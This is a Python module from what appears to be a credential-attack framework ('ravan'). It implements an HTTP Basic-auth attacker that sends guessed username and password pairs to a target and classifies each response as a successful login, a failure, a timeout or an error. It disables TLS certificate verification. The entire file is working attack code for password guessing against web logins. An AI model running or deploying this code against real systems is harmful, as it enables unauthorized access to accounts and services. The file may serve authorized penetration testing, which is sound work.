"""HTTP Basic-auth credential attacker (stdlib http.client, RFC 7617)."""

from __future__ import annotations

import base64
import contextlib
import http.client
import ssl
import time

from ravan.credential.attempt import AttemptResult, AttemptStatus
from ravan.credential.base import ProtocolAttacker


class HTTPBasicAttacker(ProtocolAttacker):
    protocol = "http-basic"
    default_port = 80

    def __init__(self, path: str = "/", tls: bool = False) -> None:
        self.path = path
        self.tls = tls

    @classmethod
    def from_config(cls, config: dict[str, object]) -> HTTPBasicAttacker:
        return cls(path=str(config.get("path", "/")), tls=bool(config.get("tls", False)))

    def authenticate(
        self, host: str, port: int, username: str, password: str, timeout: float
    ) -> AttemptResult:
        started = time.monotonic()
        token = base64.b64encode(f"{username}:{password}".encode()).decode("ascii")
        conn: http.client.HTTPConnection
        if self.tls or port == 443:
            conn = http.client.HTTPSConnection(
                host, port, timeout=timeout, context=ssl._create_unverified_context()
            )
        else:
            conn = http.client.HTTPConnection(host, port, timeout=timeout)
        try:
            conn.request(
                "GET",
                self.path,
                headers={"Authorization": f"Basic {token}", "User-Agent": "ravan-credaccess"},
            )
            resp = conn.getresponse()
            resp.read(256)
            code = resp.status
            server = resp.getheader("Server")
            elapsed = time.monotonic() - started
            if code in (401, 407):
                return self._result(
                    host, port, username, password, AttemptStatus.FAILED, error=f"HTTP {code}"
                )
            if code == 403:
                return self._result(
                    host, port, username, password, AttemptStatus.FAILED, error="HTTP 403 forbidden"
                )
            if 200 <= code < 400:
                return self._result(
                    host,
                    port,
                    username,
                    password,
                    AttemptStatus.SUCCESS,
                    banner=server,
                    response_time=elapsed,
                )
            return self._result(
                host, port, username, password, AttemptStatus.ERROR, error=f"HTTP {code}"
            )
        except TimeoutError as exc:
            return self._result(
                host, port, username, password, AttemptStatus.TIMEOUT, error=str(exc)
            )
        except (OSError, http.client.HTTPException) as exc:
            return self._result(host, port, username, password, AttemptStatus.ERROR, error=str(exc))
        finally:
            with contextlib.suppress(OSError):
                conn.close()


__all__ = ["HTTPBasicAttacker"]
